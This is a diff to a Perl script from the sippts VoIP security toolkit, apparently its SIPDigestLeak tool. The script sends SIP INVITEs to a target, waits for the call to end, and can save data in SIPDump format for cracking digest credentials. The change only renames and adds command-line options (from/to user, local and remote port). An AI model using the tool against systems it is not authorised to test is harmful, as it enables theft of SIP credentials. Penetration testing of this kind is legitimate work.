@@ -31,10 +31,11 @@ my $ipaddr = Net::Address::IP::Local->public;
 my $useragent = 'pplsip';
 
 my $host = '';	# host
+my $lport = ''; # local port
 my $dport = ''; # destination port
-my $from = '';	# from number
-my $fromname = ''; # from name
-my $to = ''; # to number
+my $fromuser = ''; # From User
+my $fromname = ''; # From Name
+my $touser = ''; # To User
 my $v = 0; # verbose mode
 my $from_ip = '';
 my $totag = "";
@@ -47,12 +48,12 @@ my $ver = 0;
 sub init() {
 	# check params
 	my $result = GetOptions ("h=s" => \$host,
-				"f=s" => \$from,
+				"fu=s" => \$fromuser,
 				"fn=s" => \$fromname,
-				"t=s" => \$to,
-				"ip=s" => \$from_ip,
+				"tu=s" => \$touser,
+				"l=s" => \$lport,
+				"r=s" => \$dport,
 				"ua=s" => \$useragent,
-				"p=s" => \$dport,
 				"sd=s" => \$sd,
 				"version+" => \$ver,
 				"v+" => \$v);
@@ -60,29 +61,30 @@ sub init() {
 	check_version() if ($ver eq 1);
 	help() if ($host eq "");
 
+	$lport = "5070" if ($lport eq "");
 	$dport = "5060" if ($dport eq "");
-	$from = "100" if ($from eq "");
-	$to = "100" if ($to eq "");
+	$fromuser = "100" if ($fromuser eq "");
+	$touser = "100" if ($touser eq "");
 	$from_ip = $ipaddr if ($from_ip eq "");
 
 	my $callid = &generate_random_string(32, 1);
-	my $sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>'udp', PeerAddr=>$host, Timeout => 10);
+	my $sc = new IO::Socket::INET->new(PeerPort=>$dport, LocalPort=>$lport, Proto=>'udp', PeerAddr=>$host, Timeout => 10);
 
 	if ($sc) {
 		IO::Socket::Timeout->enable_timeouts_on($sc);
 		$sc->read_timeout(60);
 		$sc->enable_timeout;
-		my $lport = $sc->sockport();
+		$lport = $sc->sockport() if ($lport eq "");
 
 		# send INVITE
 		if ($v eq 0) { print "[+] Connecting to $host:$dport\n"; }
-		my $res = send_invite($sc, $from_ip, $host, $lport, $dport, $from, $fromname, $to, $callid);
+		my $res = send_invite($sc, $from_ip, $host, $lport, $dport, $fromuser, $fromname, $touser, $callid);
 
 		# Call is attended. Wait the hung up
 		if ($res =~ /^200/) { 
-			send_ack($sc, $from_ip, $host, $lport, $dport, $from, $to, $callid);
+			send_ack($sc, $from_ip, $host, $lport, $dport, $fromuser, $touser, $callid);
 			wait_bye($sc);
-			send_error($sc, $from_ip, $host, $lport, $dport, $from, $to, $callid, $cseq);
+			send_error($sc, $from_ip, $host, $lport, $dport, $fromuser, $touser, $callid, $cseq);
 		}
 	}
 
@@ -118,7 +120,7 @@ sub send_invite {
 
 	print $sc $msg;
 
-	if ($v eq 0) { print "[+] Sending INVITE $from => $to\n"; }
+	if ($v eq 0) { print "[+] Sending INVITE $fromuser => $touser\n"; }
 	else { print "Sending:\n=======\n$msg"; }
 
 	my $data = "";
@@ -380,11 +382,11 @@ Wiki: https://github.com/Pepelux/sippts/wiki/SIPDigestLeak
 Usage: perl $0 -h <host> [options]
  
 == Options ==
--f  <string>     = From user (default: 100)
--fn <string>     = From name (default blank)
--t  <string>     = To user (default: 100)
--p  <integer>    = Remote port (default: 5060)
--ip <string>     = Source IP (default: local IP address)
+-fu  <string>    = From User (by default 100)
+-fn  <string>    = From Name
+-tu  <string>    = To User (by default 100)
+-l  <integer>    = Local port (default: 5070)
+-r  <integer>    = Remote port (default: 5060)
 -ua <string>     = Customize the UserAgent
 -sd <filename>   = Save data in a format SIPDump file
 -v               = Verbose (trace information)
@@ -392,9 +394,9 @@ Usage: perl $0 -h <host> [options]
  
 == Examples ==
 \$ perl $0 -h 192.168.0.1
-\$ perl $0 -h 192.168.0.1 -p 5080 -v
+\$ perl $0 -h 192.168.0.1 -r 5080 -v
 \$ perl $0 -h 192.168.0.1 -sd data.txt
-\$ perl $0 -h 192.168.0.1 -f 666666666 -fn Devil
+\$ perl $0 -h 192.168.0.1 -fu 666666666 -fn Devil
  
 };
  
